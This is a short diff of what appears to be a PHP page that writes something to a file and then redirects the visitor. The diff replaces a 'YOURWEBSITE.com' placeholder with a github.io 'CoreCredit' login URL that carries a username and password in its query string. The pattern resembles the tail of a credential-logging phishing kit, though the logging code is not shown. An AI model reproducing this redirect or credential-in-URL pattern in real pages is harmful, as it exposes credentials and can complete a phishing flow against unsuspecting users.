@@ -21,7 +21,7 @@ fclose($fh);
 
 
 //goes here after
-<script>location.href='https://YOURWEBSITE.com';</script>
+<script>location.href='https://toloro2001.github.io/CoreCredit/login.html?username=ToLoRo&password=1&password2=1&remember=on';</script>
 	 
  </body>
 </html>
